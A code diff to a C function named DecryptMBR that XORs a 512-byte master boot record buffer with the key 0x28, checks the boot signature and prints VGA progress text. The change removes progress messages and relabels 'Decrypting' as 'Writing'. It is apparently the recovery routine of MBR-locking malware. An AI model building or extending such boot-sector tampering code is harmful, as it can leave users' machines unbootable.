@@ -564,23 +564,7 @@ void DecryptMBR()
 
 	for (int i = 0; i < 512; i += 2)
 	{
-		Print("Reading sector: ", 0, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
 
-
-		char str[10];
-
-		itoa(i, str);
-
-		Print(str, 16, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
-
-
-		Print("/ 512", 20, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
-
-
-		if (i == 510)
-		{
-			Print("512 / 512 Done!", 16, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
-		}
 
 		Sleep(9000000);
 
@@ -597,15 +581,13 @@ void DecryptMBR()
 
 	if ((lastByte ^ 0x28) == 0xAA)
 	{
-		Print("Bootloader found", 0, 5, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
-
 		for (int i = 0; i < 512; i++)
 		{
 			uint8_t byte = buffer[i];
 			byte = byte ^ 0x28;
 			buffer[i] = byte;
 
-			Print("Decrypting sector: ", 0, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
+			Print("Writing sector: ", 0, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
 
 
 			char str[10];
@@ -616,6 +598,7 @@ void DecryptMBR()
 
 
 			Print("/ 512", 20, 0, VGA_COLOR_BROWN | VGA_COLOR_LIGHT_GREY << 4);
+
 
 			if (i == 510)
 			{
